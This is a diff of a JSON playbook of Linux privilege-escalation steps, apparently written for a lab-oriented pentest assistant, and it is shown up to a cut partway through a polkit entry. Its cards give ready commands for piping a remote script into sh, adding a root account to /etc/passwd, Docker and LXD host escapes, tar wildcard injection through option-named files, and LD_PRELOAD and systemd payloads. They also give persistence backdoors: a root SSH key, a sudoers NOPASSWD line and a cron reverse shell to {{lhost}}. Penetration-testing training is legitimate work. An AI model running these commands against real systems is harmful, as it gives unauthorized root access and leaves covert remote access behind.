@@ -1,597 +1,1188 @@
 {
- "id": "linux_privesc_2026_09",
- "title": "Linux Privilege Escalation",
- "source": "Project-authored (obol-local). Common-knowledge Linux privilege-escalation methodology; independent expression, not derived from any third-party card set.",
- "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
- "actions": [
-  {
-   "id": "linux-enum",
-   "title": "Local Enumeration Sweep",
-   "hypothesis": "You escalate by finding things, not by recall. Kick off a scanner such as linpeas for coverage, but review its output with a purpose: hunt for the single outlier — an odd SUID bit, a writable path, a secret sitting in a config — rather than skimming the whole colorized dump. Confirm the candidate by hand before you sink time into an exploit.",
-   "tool": "linpeas",
-   "tools": [
-    "linpeas"
-   ],
-   "os": [
-    "linux"
-   ],
-   "requires_all": [],
-   "requires_any": [
-    "foothold.linux"
-   ],
-   "deprioritize_when": [
-    "access.admin",
-    "access.system"
-   ],
-   "produces": [
-    "privesc.leads",
-    "host.kernel",
-    "host.arch"
-   ],
-   "priority": 94,
-   "proves": "surfaces candidate local privilege-escalation paths, the host kernel/version, and the host architecture",
-   "does_not_prove": "this is a local privesc lead only — it is not admin/root/SYSTEM access until that is demonstrated on its own",
-   "report": {
-    "finding": "Local Privilege Escalation Vector",
-    "severity": "high"
-   },
-   "refs": [
-    "https://github.com/peass-ng/PEASS-ng",
-    "https://github.com/rebootuser/LinEnum"
-   ],
-   "commands": [
+  "id": "linux_privesc_2026_09",
+  "title": "Linux Privilege Escalation",
+  "source": "Project-authored (obol-local). Common-knowledge Linux privilege-escalation methodology; independent expression, not derived from any third-party card set.",
+  "license": "Project-authored data (obol-local). No third-party copyleft obligation.",
+  "actions": [
     {
-     "tool": "linpeas",
-     "run": "curl -L http://{{lhost}}:8000/linpeas.sh | sh",
-     "note": "Host it from your own machine (a mentor can serve it for you). Add a tee so you retain a local transcript as evidence."
+      "id": "linux-enum",
+      "title": "Local Enumeration Sweep",
+      "hypothesis": "You escalate by finding things, not by recall. Kick off a scanner such as linpeas for coverage, but review its output with a purpose: hunt for the single outlier (an odd SUID bit, a writable path, a secret sitting in a config) rather than skimming the whole colorized dump. Confirm the candidate by hand before you sink time into an exploit.",
+      "tool": "linpeas",
+      "tools": [
+        "linpeas"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.linux"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "privesc.leads",
+        "host.kernel",
+        "host.arch"
+      ],
+      "priority": 94,
+      "proves": "surfaces candidate local privilege-escalation paths, the host kernel/version, and the host architecture",
+      "does_not_prove": "this is a local privesc lead only, it is not admin/root/SYSTEM access until that is demonstrated on its own",
+      "report": {
+        "finding": "Local Privilege Escalation Vector",
+        "severity": "high"
+      },
+      "refs": [
+        "https://github.com/peass-ng/PEASS-ng",
+        "https://github.com/rebootuser/LinEnum"
+      ],
+      "commands": [
+        {
+          "tool": "linpeas",
+          "run": "curl -L http://{{lhost}}:8000/linpeas.sh | sh",
+          "note": "Host it from your own machine (a mentor can serve it for you). Add a tee so you retain a local transcript as evidence."
+        },
+        {
+          "tool": "sh",
+          "run": "sudo -l && id && cat /etc/passwd | grep -E \"sh$\"",
+          "note": "The three questions that matter: what sudo is available to me, which identity I hold, and which other accounts exist."
+        },
+        {
+          "tool": "sh",
+          "run": "find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null; ls -la /etc/cron*; crontab -l",
+          "note": "SUID files, capabilities, and cron in a single command, the three checks that most often decide a lab."
+        }
+      ]
     },
     {
-     "tool": "sh",
-     "run": "sudo -l && id && cat /etc/passwd | grep -E \"sh$\"",
-     "note": "The three questions that matter: what sudo is available to me, which identity I hold, and which other accounts exist."
+      "id": "sudo-abuse",
+      "title": "Sudo / GTFOBins Abuse",
+      "hypothesis": "Entries returned by sudo -l on ordinary binaries frequently mean immediate root: any tool with a sudo entry on GTFOBins (vim, find, awk, tar, less, python...) has a published shell-escape technique. A NOPASSWD entry just hands it to you.",
+      "tool": "sudo",
+      "tools": [
+        "sudo"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.sudo_rights",
+        "privesc.sudo_binary"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 80,
+      "proves": "demonstrates administrative/root access",
+      "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
+      "report": {
+        "finding": "sudo Misconfiguration (GTFOBins)",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://gtfobins.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "sudo -l",
+          "note": "Go through each line. Look up every listed binary on gtfobins.github.io."
+        },
+        {
+          "tool": "sh",
+          "run": "sudo {{binary}} -c \"!/bin/sh\"",
+          "note": "This is the general shape; the precise escape varies by binary, GTFOBins provides the exact command for each tool."
+        }
+      ]
     },
     {
-     "tool": "sh",
-     "run": "find / -perm -4000 2>/dev/null; getcap -r / 2>/dev/null; ls -la /etc/cron*; crontab -l",
-     "note": "SUID files, capabilities, and cron in a single command — the three checks that most often decide a lab."
+      "id": "writable-passwd",
+      "title": "Writable /etc/passwd",
+      "hypothesis": "When /etc/passwd is writable by everyone (it turns up in labs more often than expected), you can add a root-equivalent account using a hash you produce on your own machine. There is no exploit involved, the file itself defines the trust boundary, and here it is wide open.",
+      "tool": "openssl",
+      "tools": [
+        "openssl"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.passwd_writable"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 74,
+      "proves": "demonstrates administrative/root access",
+      "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
+      "report": {
+        "finding": "World-Writable /etc/passwd",
+        "severity": "critical"
+      },
+      "refs": [],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "ls -la /etc/passwd",
+          "note": "Verify the write permission first. -rw-rw-rw- is the green light."
+        },
+        {
+          "tool": "openssl",
+          "run": "openssl passwd {{password}}",
+          "note": "Produce the hash on your own machine first."
+        },
+        {
+          "tool": "sh",
+          "run": "echo 'r00t:HASH_FROM_OPENSSL:0:0:root:/root:/bin/bash' >> /etc/passwd",
+          "note": "Add the crafted account, then run: su r00t. Swap HASH_FROM_OPENSSL for the hash you generated."
+        }
+      ]
+    },
+    {
+      "id": "nfs-squash",
+      "title": "NFS no_root_squash",
+      "hypothesis": "An NFS share exported with no_root_squash honors remote root: mount it from your attacking host (or from a foothold), leave a SUID binary or a root-owned shell on it, and run that as root on the target.",
+      "tool": "showmount",
+      "tools": [
+        "showmount",
+        "mount"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.nfs_no_root_squash",
+        "port:2049"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 74,
+      "proves": "demonstrates administrative/root access",
+      "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
+      "report": {
+        "finding": "NFS no_root_squash Misconfiguration",
+        "severity": "high"
+      },
+      "refs": [],
+      "commands": [
+        {
+          "tool": "showmount",
+          "run": "showmount -e {{target}}",
+          "note": "Enumerate the exports; if you cannot read the options directly, check for no_root_squash in /etc/exports from the foothold."
+        },
+        {
+          "tool": "sh",
+          "run": "mount -t nfs {{target}}:/share /mnt/nfs && cp /bin/bash /mnt/nfs/bash && chmod +s /mnt/nfs/bash",
+          "note": "Drop a SUID bash onto the share..."
+        },
+        {
+          "tool": "sh",
+          "run": "/share/bash -p",
+          "note": "...then execute it on the target using -p so it retains effective root."
+        }
+      ]
+    },
+    {
+      "id": "lxc-lxd-escape",
+      "title": "LXC/LXD Group Escape",
+      "hypothesis": "Being in the lxd group is root without a password: lxd lets you spin up a privileged container, bind the host filesystem inside it, and then read or write anything as root. It is among the most frequent intended privesc routes in HTB/0xdf machines. Once `id` reports lxd (or lxc), the box is effectively done, everything after is procedure.",
+      "tool": "lxc",
+      "tools": [
+        "lxc"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.lxd_group"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 74,
+      "proves": "demonstrates administrative/root access",
+      "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
+      "report": {
+        "finding": "LXD Group Membership Grants Root",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.html"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "id",
+          "note": "Verify lxd or lxc group membership before doing anything else."
+        },
+        {
+          "tool": "lxc",
+          "run": "lxc image list",
+          "note": "Reuse an existing image if one is present. Otherwise build your own locally: clone lxc-alpine-builder, build alpine.tar.gz, move it over, then run `lxc image import alpine.tar.gz --alias alpine`."
+        },
+        {
+          "tool": "lxc",
+          "run": "lxc init alpine privesc -c security.privileged=true",
+          "note": "A privileged container means root inside the container is root on the host."
+        },
+        {
+          "tool": "lxc",
+          "run": "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true",
+          "note": "Bind the whole host filesystem into the container."
+        },
+        {
+          "tool": "lxc",
+          "run": "lxc start privesc && lxc exec privesc /bin/sh",
+          "note": "From inside the container, /mnt/root is the host filesystem accessible as root. Grab flags, create accounts, finished."
+        }
+      ]
+    },
+    {
+      "id": "docker-socket",
+      "title": "Docker Socket / docker Group Escape",
+      "hypothesis": "A writable /var/run/docker.sock (or being in the docker group) amounts to root on the host: launch a container with the host filesystem attached and chroot into it. It is the same idea as LXD with a different daemon.",
+      "tool": "docker",
+      "tools": [
+        "docker"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.docker_group"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 74,
+      "proves": "demonstrates administrative/root access",
+      "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
+      "report": {
+        "finding": "Docker Socket Access Grants Root",
+        "severity": "critical"
+      },
+      "refs": [],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "ls -la /var/run/docker.sock && id",
+          "note": "If the socket is writable by you, or you are in the docker group → it is over."
+        },
+        {
+          "tool": "docker",
+          "run": "docker images",
+          "note": "Choose any image already present so you avoid pulling over the network."
+        },
+        {
+          "tool": "docker",
+          "run": "docker run -v /:/mnt --rm -it {{image}} chroot /mnt sh",
+          "note": "The host filesystem lands at /mnt with root privileges. Replace with an image from the docker images listing."
+        }
+      ]
+    },
+    {
+      "id": "suid-gtfobins",
+      "title": "SUID Binary Abuse",
+      "hypothesis": "SUID binaries execute with their owner's identity (typically root). The stock ones (su, sudo, mount) are expected, what you want is the OUTLIER: a custom or out-of-place binary carrying the SUID bit. Check anything unusual against GTFOBins; there are plenty of boxes where find / -perm -4000 alone is the whole path to root.",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.suid_candidate"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.admin",
+        "privesc.leads"
+      ],
+      "priority": 78,
+      "proves": "demonstrates administrative/root access and surfaces candidate local privilege-escalation paths",
+      "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
+      "report": {
+        "finding": "Exploitable SUID Binary",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://gtfobins.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "find / -perm -4000 -type f 2>/dev/null",
+          "note": "Enumerate every SUID binary. Measure against the default set, anything that is not standard is your lead."
+        },
+        {
+          "tool": "sh",
+          "run": "find / -perm -g=s -o -perm -u=s -type f 2>/dev/null | xargs ls -la",
+          "note": "SUID and SGID together with ownership shown. SGID on notable groups matters (adm → read /var/log, shadow → crack root)."
+        }
+      ]
+    },
+    {
+      "id": "pspy-monitor",
+      "title": "Process Monitoring (pspy)",
+      "hypothesis": "Cron entries and timers execute root commands you will not find in /etc/crontab. pspy observes process creation WITHOUT needing root and exposes them: scripts sitting in writable paths, commands that leak credentials through their arguments, backup jobs open to hijack. When static enumeration dries up, watching the machine in motion is the next step, 0xdf uses pspy all the time.",
+      "tool": "pspy",
+      "tools": [
+        "pspy"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.linux",
+        "privesc.leads"
+      ],
+      "produces": [
+        "privesc.process_lead",
+        "credential.candidate"
+      ],
+      "priority": 72,
+      "proves": "surfaces a process-monitoring privesc lead and candidate credentials",
+      "does_not_prove": "this is a local privesc lead only, it is not admin/root/SYSTEM access until that is demonstrated on its own",
+      "report": {
+        "finding": "Scheduled Task Credential/Script Exposure",
+        "severity": "high"
+      },
+      "refs": [
+        "https://github.com/DominicBreuker/pspy"
+      ],
+      "commands": [
+        {
+          "tool": "pspy",
+          "run": "./pspy64 -pf -i 1000",
+          "note": "Serve pspy from your machine (python3 -m http.server), wget it into /tmp or /dev/shm, chmod +x, then run it. -p reports processes, -f filesystem events, -i is the poll interval in ms."
+        },
+        {
+          "tool": "sh",
+          "run": "watch -n1 \"ps aux | grep root | grep -v \\[\"",
+          "note": "A budget substitute for pspy on brief jobs. Root processes flickering past indicate a scheduled task."
+        }
+      ]
+    },
+    {
+      "id": "cron-abuse",
+      "title": "Cron Job Abuse and Tar Wildcards",
+      "hypothesis": "Two variants: (1) a root cron job executes a script you can WRITE, modify it, wait for the run, become root. (2) A root job runs tar/rsync/chown using a WILDCARD inside a directory you control, you cannot alter the command, yet you can drop files whose NAMES smuggle in options (tartarsauce: --checkpoint-action=exec). Wildcard injection is the move that catches people off guard.",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.cron_writable",
+        "privesc.process_lead"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 74,
+      "proves": "demonstrates administrative/root access",
+      "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
+      "report": {
+        "finding": "Cron Job Abuse Leading to Root",
+        "severity": "critical"
+      },
+      "refs": [
+        "https://gtfobins.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers",
+          "note": "List the jobs. For every script ask: can you write to it? Is its directory writable? Does it rely on wildcards?"
+        },
+        {
+          "tool": "sh",
+          "run": "echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/writable-script.sh",
+          "note": "For a writable root-run script: tack on a SUID dropper, let the schedule fire, then run /tmp/rootbash -p."
+        },
+        {
+          "tool": "sh",
+          "run": "cd /writable/backup/dir && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh shell.sh' && echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' > shell.sh",
+          "note": "Tar wildcard injection: filenames that double as options. When root's tar -cf ... * runs, your checkpoint fires. The same idea applies to rsync (--rsh) and chown (--reference)."
+        }
+      ]
+    },
+    {
+      "id": "capabilities",
+      "title": "Linux Capabilities Abuse",
+      "hypothesis": "Capabilities carve up root's privileges, and misplaced ones become privesc: cap_setuid on python/perl is an instant root shell, cap_dac_read_search lets you read any file (shadow), cap_sys_admin is close to root. getcap locates them; GTFOBins documents a capabilities section for every interpreter.",
+      "tool": "python3",
+      "tools": [
+        "python3"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "privesc.capability"
+      ],
+      "deprioritize_when": [
+        "access.admin",
+        "access.system"
+      ],
+      "produces": [
+        "access.admin",
+        "loot.files"
+      ],
+      "priority": 78,
+      "proves": "demonstrates administrative/root access and recovers files",
+      "does_not_prove": "you only hold root/admin when the command output shows it; enumerated local leads by themselves are not privileged access",
+      "report": {
+        "finding": "Dangerous Linux Capability Assignment",
+        "severity": "high"
+      },
+      "refs": [
+        "https://gtfobins.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "getcap -r / 2>/dev/null",
+          "note": "Enumerate all file capabilities. Anything set on an interpreter (python, perl, ruby, php, openssl, tcpdump) is a lead."
+        },
+        {
+          "tool": "python3",
+          "run": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
+          "note": "cap_setuid on python yields a root shell. Perl equivalent: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'"
+        },
+        {
+          "tool": "sh",
+          "run": "tcpdump -ni any -w /tmp/cap.pcap &",
+          "note": "cap_net_raw on tcpdump lets you capture traffic from the foothold; credentials in plaintext protocols fall straight into your hands."
+        }
+      ]
+    },
+    {
+      "id": "linux-loot-hunt",
+      "title": "Loot Hunting (Linux)",
+      "hypothesis": "Ahead of the exotic techniques, go looking for loot: shell history, configs containing passwords, other users' readable home directories, backups under /opt and /var, mail spools. Credentials repeatedly turn up in history files and config files, and a .bash_history symlinked to /dev/null is itself a tell that the author stashed something somewhere else.",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "foothold.linux",
+        "privesc.leads"
+      ],
+      "produces": [
+        "credential.candidate",
+        "loot.files"
+      ],
+      "priority": 82,
+      "proves": "surfaces candidate credentials and recovers files",
+      "does_not_prove": "this is credential material only, it is not access until it successfully authenticates against a service",
+      "report": {
+        "finding": "Credentials in Plaintext on Filesystem",
+        "severity": "high"
+      },
+      "refs": [
+        "https://github.com/peass-ng/PEASS-ng"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cat ~/.bash_history; ls -la /home/*/; cat /home/*/.bash_history 2>/dev/null",
+          "note": "History files: commands leak passwords supplied as arguments, along with paths and other hosts."
+        },
+        {
+          "tool": "sh",
+          "run": "grep -rniE 'passw|secret|token|api[_-]?key' /etc /opt /var/www /srv 2>/dev/null | grep -v Binary | head -50",
+          "note": "A config-grep sweep. /var/www configs carry DB credentials; /opt holds backup scripts with baked-in passwords."
+        },
+        {
+          "tool": "sh",
+          "run": "ls -la /var/mail/ /tmp /dev/shm /var/backups 2>/dev/null; find / -name '*.kdbx' -o -name 'id_rsa' -o -name '*.bak' 2>/dev/null | grep -v '^/proc'",
+          "note": "Mail spools (the beep pattern), temp directories, backups, key files, KeePass databases."
+        }
+      ]
+    },
+    {
+      "id": "linux-persistence",
+      "title": "Linux Persistence (Post-Root)",
+      "hypothesis": "Once you have root, leave a way back in that outlasts password resets and reboots, handy for extended labs and when an exam permits re-entry. The low-profile choices: your SSH key in root's authorized_keys, a sudoers line for a low-priv account you own, or a cron callback. (Record everything you place.)",
+      "tool": "sh",
+      "tools": [
+        "sh"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [],
+      "requires_any": [
+        "access.admin"
+      ],
+      "produces": [
+        "persistence.linux"
+      ],
+      "priority": 50,
+      "proves": "sets up a Linux persistence foothold",
+      "does_not_prove": "this is persistence-setup context, document it and clean it up; it is not a new privilege level",
+      "report": {
+        "finding": "Persistence Mechanism Planted",
+        "severity": "informational"
+      },
+      "refs": [
+        "https://gtfobins.github.io/"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAA... your-public-key' >> /root/.ssh/authorized_keys",
+          "note": "A common pattern in the field (admirer, brainfuck, armageddon). Create the keypair on YOUR machine first: ssh-keygen -t ed25519."
+        },
+        {
+          "tool": "sh",
+          "run": "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
+          "note": "A sudoers backdoor for an account you already own, it endures through root password changes."
+        },
+        {
+          "tool": "sh",
+          "run": "echo '* * * * * root bash -c \"bash -i >& /dev/tcp/{{lhost}}/{{lport}} 0>&1\"' >> /etc/crontab",
+          "note": "A cron callback. Louder; favor keys when SSH is reachable."
+        }
+      ]
+    },
+    {
+      "id": "linux-kernel-exploit",
+      "title": "Linux Kernel Exploit (last-resort LPE)",
+      "phase": "escalate",
+      "hypothesis": "When the misconfiguration checks (sudo, SUID, capabilities, cron, writable files) come up empty, a vulnerable kernel is still a clean path to root. The work is matching: read the exact kernel version and distribution, rank public exploits with an exploit-suggester, and fire only one whose preconditions you meet. Modern labs lean on a handful (PwnKit, DirtyPipe, Sudo Baron Samedit, DirtyCow), which are reliable when the version lines up.",
+      "tool": "sh",
+      "tools": [
+        "linux-exploit-suggester",
+        "gcc",
+        "searchsploit"
+      ],
+      "requires_any": [
+        "host.kernel",
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 40,
+      "autonomy": "manual",
+      "sequence": true,
+      "proves": "a root shell where a public kernel exploit matches the running kernel",
+      "does_not_prove": "anything until the exploit actually lands, and a mismatched exploit can panic the box",
+      "report": {
+        "finding": "Linux kernel local privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "uname -a; cat /etc/os-release",
+          "note": "Pin the exact kernel and distribution before choosing an exploit."
+        },
+        {
+          "tool": "linux-exploit-suggester",
+          "run": "./linux-exploit-suggester.sh",
+          "note": "Rank public LPE exploits by how well your kernel matches; start with highly probable."
+        },
+        {
+          "tool": "searchsploit",
+          "run": "searchsploit linux kernel {{kernel}} local",
+          "note": "Cross-check the suggester against ExploitDB for a known-good PoC."
+        },
+        {
+          "tool": "sh",
+          "run": "gcc exploit.c -o exploit && ./exploit",
+          "note": "Read the source first; compile on a matching box, then run and confirm uid=0."
+        }
+      ]
+    },
+    {
+      "id": "linux-path-hijack",
+      "title": "PATH Hijack of a SUID/cron Binary",
+      "phase": "escalate",
+      "hypothesis": "A root SUID binary or root cron job that calls another program by its bare name, not an absolute path, resolves that name through PATH. Put a directory you control at the front of PATH, drop a program with the same name, and your code runs with the caller's privileges. The whole technique is spotting the relative call with strings or ltrace, then three commands to a root shell.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "strings",
+        "ltrace"
+      ],
+      "requires_any": [
+        "privesc.suid_candidate",
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 52,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a root shell where a privileged binary calls a program by a hijackable bare name",
+      "does_not_prove": "anything unless the call is genuinely relative, an absolute path cannot be hijacked this way",
+      "report": {
+        "finding": "PATH hijack of a privileged binary",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "find / -perm -4000 -type f 2>/dev/null",
+          "note": "List SUID binaries; a non-standard one is the candidate to inspect."
+        },
+        {
+          "tool": "strings",
+          "run": "strings {{suid_bin}}; ltrace {{suid_bin}} 2>&1 | grep -i exec",
+          "note": "Confirm it calls a program by bare name, not an absolute path."
+        },
+        {
+          "tool": "sh",
+          "run": "echo '/bin/bash -p' > /tmp/{{hijack_name}} && chmod +x /tmp/{{hijack_name}} && export PATH=/tmp:$PATH",
+          "note": "Drop a replacement with the hijacked name and put your directory first in PATH."
+        },
+        {
+          "tool": "sh",
+          "run": "{{suid_bin}}; id",
+          "note": "Run the SUID binary; it resolves the bare name to yours and runs it as root."
+        }
+      ]
+    },
+    {
+      "id": "linux-ld-preload",
+      "title": "sudo LD_PRELOAD Library Injection",
+      "phase": "escalate",
+      "hypothesis": "When sudo preserves LD_PRELOAD (env_keep += LD_PRELOAD in the policy), any command you may run with sudo loads a shared library you point it at, as root. Write a tiny .so whose constructor sets the uid to 0 and execs a shell, then run the permitted sudo command with LD_PRELOAD set to it. The tell is in sudo -l; the specific allowed command does not matter.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "gcc"
+      ],
+      "requires_any": [
+        "privesc.sudo_rights",
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 54,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "a root shell where sudo preserves LD_PRELOAD or LD_LIBRARY_PATH",
+      "does_not_prove": "anything unless env_keep actually carries the variable, sudo strips it otherwise",
+      "report": {
+        "finding": "sudo LD_PRELOAD privilege escalation",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "sudo -l",
+          "note": "Look for env_keep carrying LD_PRELOAD or LD_LIBRARY_PATH; that is the whole vulnerability."
+        },
+        {
+          "tool": "gcc",
+          "run": "gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles",
+          "note": "Build a .so whose constructor sets uid 0 and execs a shell."
+        },
+        {
+          "tool": "sh",
+          "run": "sudo LD_PRELOAD=/tmp/x.so {{sudo_command}}",
+          "note": "Run the permitted sudo command with LD_PRELOAD set; the library elevates before it starts."
+        },
+        {
+          "tool": "sh",
+          "run": "id",
+          "note": "Confirm the shell is uid 0."
+        }
+      ]
+    },
+    {
+      "id": "wildcard-injection",
+      "title": "Wildcard Injection in a Privileged Command",
+      "phase": "escalate",
+      "hypothesis": "When a root cron or script runs a command with a wildcard in a directory you can write (tar, chown, rsync, 7z on *), the shell expands the wildcard to include filenames, and several tools treat filenames that look like options as options. Drop files whose names are command-line flags (for tar, --checkpoint and --checkpoint-action=exec) and the privileged command runs your code. The tell is a privileged job that cd's into a writable directory and runs a tool on *.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "tar",
+        "pspy"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "privesc.cron",
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 52,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root where a privileged wildcard command runs in a directory you can write",
+      "does_not_prove": "anything unless the directory is writable and the tool honours option-like filenames",
+      "report": {
+        "finding": "Wildcard injection in a root-run command",
+        "severity": "high"
+      },
+      "refs": [
+        "https://www.exploit-db.com/papers/33930"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "cat /etc/crontab; grep -r \"\\*\" /etc/cron* 2>/dev/null",
+          "note": "Find a privileged tool invoked on * in a directory you can write. pspy catches ones the cron files do not name."
+        },
+        {
+          "tool": "sh",
+          "run": "ls -ld {{writable_dir}}",
+          "note": "A writable directory is what lets you drop the flag-named files tar will expand and act on."
+        },
+        {
+          "tool": "sh",
+          "run": "echo \"cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\" > {{writable_dir}}/x.sh",
+          "note": "Stage a payload that makes a SUID copy of bash; call it later with bash -p."
+        },
+        {
+          "tool": "sh",
+          "run": "cd {{writable_dir}} && touch -- '--checkpoint=1' '--checkpoint-action=exec=sh x.sh'",
+          "note": "The shell passes these flag-named files to tar as options; on the next run it executes your script as root."
+        },
+        {
+          "tool": "sh",
+          "run": "/tmp/rootbash -p -c id",
+          "note": "uid=0 from the SUID bash confirms root on demand."
+        }
+      ]
+    },
+    {
+      "id": "systemd-timer-abuse",
+      "title": "Writable systemd Unit / Timer to Root",
+      "phase": "escalate",
+      "hypothesis": "systemd runs services and timers as root, so a unit file you can write, a timer pointing at a writable script, or a service with a PATH-hijackable relative ExecStart all give root on the next start or trigger. The tell is a non-default service or timer whose file or target you can edit; a find for writable units under the systemd directories surfaces them. It is the systemd-era version of cron abuse.",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "systemctl",
+        "find"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_any": [
+        "foothold.linux",
+        "access.shell"
+      ],
+      "produces": [
+        "access.admin"
+      ],
+      "priority": 50,
+      "autonomy": "approve",
+      "sequence": true,
+      "proves": "root where a root-run unit file or its ExecStart target is writable by you",
+      "does_not_prove": "anything unless the unit actually runs as root and you can write it or its target",
+      "report": {
+        "finding": "Writable systemd unit executed as root",
+        "severity": "high"
+      },
+      "refs": [
+        "https://book.hacktricks.xyz/linux-hardening/privilege-escalation#systemd"
+      ],
+      "commands": [
+        {
+          "tool": "sh",
+          "run": "find /etc/systemd /lib/systemd -writable -type f 2>/dev/null",
+          "note": "A writable unit file (or a timer target) is a direct root-execution primitive."
+        },
+        {
+          "tool": "systemctl",
+          "run": "systemctl cat {{unit}} | grep -iE \"User|ExecStart\"",
+          "note": "No User= line means it runs as root; the ExecStart target is what you control."
+        },
+        {
+          "tool": "sh",
+          "run": "sed -i 's#ExecStart=.*#ExecStart=/bin/bash -c \"cp /bin/bash /tmp/rb; chmod +s /tmp/rb\"#' {{unit_path}}",
+          "note": "Point ExecStart at a payload that makes a SUID bash copy."
+        },
+        {
+          "tool": "systemctl",
+          "run": "systemctl daemon-reload 2>/dev/null; systemctl start {{unit}} 2>/dev/null; /tmp/rb -p -c id",
+          "note": "Reload and start it, or wait for its timer; uid=0 confirms root."
+        }
+      ]
+    },
+    {
+      "id": "polkit-abuse",
